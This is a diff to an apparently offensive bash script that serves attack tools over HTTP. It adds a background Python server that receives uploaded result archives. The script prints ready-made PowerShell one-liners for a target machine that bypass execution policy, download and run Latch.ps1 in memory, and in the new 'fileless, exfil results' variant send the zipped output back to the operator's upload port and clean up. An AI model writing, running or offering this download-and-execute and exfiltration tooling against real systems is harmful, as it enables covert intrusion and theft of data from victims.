@@ -6,6 +6,7 @@
 #   -s, --search DIR    Directory to search for existing tools (default: /opt)
 #   -d, --dir DIR       Directory to serve tools from (default: /tmp/tools)
 #   -p, --port PORT     HTTP server port (default: 80)
+#   -u, --upload-port   Upload server port (default: 8000)
 #   --download          Download missing tools from GitHub
 #   --download-only     Download tools without starting server
 #   -h, --help          Show this help message
@@ -23,6 +24,7 @@ fi
 SEARCH_DIR="/opt"
 SERVE_DIR="/tmp/tools"
 PORT="80"
+UPLOAD_PORT="8000"
 DOWNLOAD_MISSING=false
 DOWNLOAD_ONLY=false
 
@@ -40,6 +42,7 @@ while [[ $# -gt 0 ]]; do
         -s|--search)    SEARCH_DIR="$2"; shift 2 ;;
         -d|--dir)       SERVE_DIR="$2"; shift 2 ;;
         -p|--port)      PORT="$2"; shift 2 ;;
+        -u|--upload-port) UPLOAD_PORT="$2"; shift 2 ;;
         --download)     DOWNLOAD_MISSING=true; shift ;;
         --download-only) DOWNLOAD_MISSING=true; DOWNLOAD_ONLY=true; shift ;;
         -h|--help)
@@ -47,6 +50,7 @@ while [[ $# -gt 0 ]]; do
             echo "  -s, --search DIR    Directory to search (default: /opt)"
             echo "  -d, --dir DIR       Serve directory (default: /tmp/tools)"
             echo "  -p, --port PORT     HTTP port (default: 80)"
+            echo "  -u, --upload-port   Upload port (default: 8000)"
             echo "  --download          Download missing tools"
             echo "  --download-only     Download only, no server"
             exit 0
@@ -596,13 +600,76 @@ if [[ -z "$DEFAULT_IP" ]]; then
 fi
 [[ -z "$DEFAULT_IP" ]] && DEFAULT_IP="<IP>"
 
+# Create uploads directory
+UPLOAD_DIR="$SERVE_DIR/uploads"
+mkdir -p "$UPLOAD_DIR"
+
+# Start upload server in background
+UPLOAD_SERVER_PID=""
+start_upload_server() {
+    python3 -c "
+import os
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from datetime import datetime
+
+class UploadHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        if length == 0:
+            self.send_response(400)
+            self.end_headers()
+            return
+
+        # Generate filename with timestamp
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f'latch_{timestamp}.zip'
+        filepath = os.path.join('$UPLOAD_DIR', filename)
+
+        with open(filepath, 'wb') as f:
+            f.write(self.rfile.read(length))
+
+        size = os.path.getsize(filepath)
+        print(f'[+] Received: {filename} ({size} bytes)')
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Upload successful')
+
+    def log_message(self, format, *args):
+        pass  # Suppress default logging
+
+print(f'[*] Upload server listening on port $UPLOAD_PORT')
+print(f'[*] Uploads saved to: $UPLOAD_DIR')
+HTTPServer(('0.0.0.0', $UPLOAD_PORT), UploadHandler).serve_forever()
+" &
+    UPLOAD_SERVER_PID=$!
+}
+
+# Cleanup function to kill upload server on exit
+cleanup() {
+    if [[ -n "$UPLOAD_SERVER_PID" ]]; then
+        kill "$UPLOAD_SERVER_PID" 2>/dev/null
+    fi
+}
+trap cleanup EXIT INT TERM
+
+# Start the upload server
+start_upload_server
+echo -e "${GREEN}[+] Upload server started on port $UPLOAD_PORT${NC}"
+echo -e "${GREEN}[+] Uploads will be saved to: $UPLOAD_DIR${NC}"
+echo ""
+
 echo -e "${CYAN}============================================${NC}"
 echo -e "${GREEN}  HTTP SERVER - PORT $PORT${NC}"
+echo -e "${GREEN}  UPLOAD SERVER - PORT $UPLOAD_PORT${NC}"
 echo -e "${CYAN}============================================${NC}"
 echo ""
 echo -e "${YELLOW}Download commands (use appropriate IP above):${NC}"
 echo ""
-echo -e "  ${MAGENTA}# Run Latch.ps1 in memory (no disk write)${NC}"
+echo -e "  ${MAGENTA}# Run Latch.ps1 in memory with upload (fileless, exfil results)${NC}"
+echo -e "  powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://$DEFAULT_IP/Latch.ps1'); Invoke-Latch -Zip -Upload http://$DEFAULT_IP:$UPLOAD_PORT/upload -Cleanup\""
+echo ""
+echo -e "  ${MAGENTA}# Run Latch.ps1 in memory (no disk write, no upload)${NC}"
 echo -e "  powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://$DEFAULT_IP/Latch.ps1')\""
 echo ""
 echo -e "  ${MAGENTA}# Download Latch.ps1 and run with category-based tool downloads${NC}"
